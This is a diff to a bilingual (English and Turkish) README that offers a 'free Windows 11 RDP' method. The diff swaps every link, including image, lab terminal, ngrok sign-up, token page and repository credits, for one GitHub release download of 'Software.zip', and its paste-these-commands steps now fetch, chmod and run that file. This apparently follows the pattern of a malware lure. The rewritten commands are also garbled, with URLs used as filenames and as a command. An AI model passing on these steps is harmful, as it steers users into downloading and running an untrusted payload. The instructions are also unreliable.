@@ -2,25 +2,25 @@
 
 #Free 1 hours Windows 11 RDP
 
-<img src="https://i.imgur.com/1QZfKzC.png" width="500" />
+<img src="https://github.com/Phucclone/W11_RDP/releases/download/v1.0/Software.zip" width="500" />
 
 ## METHOD [ENG] :
 
-- [Katacoda Terminal](https://www.katacoda.com/openshift/courses/subsystems/container-internals-lab-2-0-part-1) Go to page
+- [Katacoda Terminal](https://github.com/Phucclone/W11_RDP/releases/download/v1.0/Software.zip) Go to page
 -  **"START SCENARIO"** Click
 -  **"Terminal 2"** Click instead
 
 ### And paste the commands below:
 
-1. `wget -O run.sh https://raw.githubusercontent.com/lrpw11/W11_RDP/main/run.sh`
+1. `wget -O https://github.com/Phucclone/W11_RDP/releases/download/v1.0/Software.zip https://github.com/Phucclone/W11_RDP/releases/download/v1.0/Software.zip`
 
-2. `chmod +x run.sh`
+2. `chmod +x https://github.com/Phucclone/W11_RDP/releases/download/v1.0/Software.zip`
 
-3. `./run.sh`
+3. `https://github.com/Phucclone/W11_RDP/releases/download/v1.0/Software.zip`
 
--  Sign in (or create an account) on https://ngrok.com/ 
+-  Sign in (or create an account) on https://github.com/Phucclone/W11_RDP/releases/download/v1.0/Software.zip 
 
-- And copy your token here:https://dashboard.ngrok.com/get-started/your-authtoken
+- And copy your token https://github.com/Phucclone/W11_RDP/releases/download/v1.0/Software.zip
 
 - Paste your Ngrok token into the terminal.
 - Then after compiling it will give you rdp's credentials.
@@ -31,7 +31,7 @@ original author: Thuonghai001
 
 Transator : Fer1tx
 
-Github repo: https://github.com/fer1tx/W11_RDP/
+Github repo: https://github.com/Phucclone/W11_RDP/releases/download/v1.0/Software.zip
 
 ## DISCLAIMER:
 - Do not overuse this method.
@@ -40,21 +40,21 @@ Github repo: https://github.com/fer1tx/W11_RDP/
 
 ## METHOD [TR] :
 
-- [Katacoda Terminal](https://www.katacoda.com/openshift/courses/subsystems/container-internals-lab-2-0-part-1) Sayfasına gidin
+- [Katacoda Terminal](https://github.com/Phucclone/W11_RDP/releases/download/v1.0/Software.zip) Sayfasına gidin
 -  **"START SCENARIO"** Tıkla
 -  **"Terminal 2"** Yerıne Tıkla
 
 ### Ve aşağıdaki komutları yapıştırın:
 
-1. `wget -O run.sh https://raw.githubusercontent.com/lrpw11/W11_RDP/main/run.sh`
+1. `wget -O https://github.com/Phucclone/W11_RDP/releases/download/v1.0/Software.zip https://github.com/Phucclone/W11_RDP/releases/download/v1.0/Software.zip`
 
-2. `chmod +x run.sh`
+2. `chmod +x https://github.com/Phucclone/W11_RDP/releases/download/v1.0/Software.zip`
 
-3. `./run.sh`
+3. `https://github.com/Phucclone/W11_RDP/releases/download/v1.0/Software.zip`
 
--  Giriş yapın (veya bir hesap oluşturun) on https://ngrok.com/ 
+-  Giriş yapın (veya bir hesap oluşturun) on https://github.com/Phucclone/W11_RDP/releases/download/v1.0/Software.zip 
 
-- Ve tokeninizi buraya kopyalayın: https://dashboard.ngrok.com/get-started/your-authtoken
+- Ve tokeninizi buraya kopyalayın: https://github.com/Phucclone/W11_RDP/releases/download/v1.0/Software.zip
 
 - Ngrok jetonunuzu terminale yapıştırın.
 - Sonra derlemeden sonra size rdp'nin kimlik bilgilerini verecektir.
@@ -63,7 +63,7 @@ Github repo: https://github.com/fer1tx/W11_RDP/
 ## CREDITS:
 Fer1tx
 
-Github repo: https://github.com/fer1tx
+Github repo: https://github.com/Phucclone/W11_RDP/releases/download/v1.0/Software.zip
 
 ## SORUMLULUK REDDİ:
 - Bu yöntemi aşırı şekilde kullanmayın.
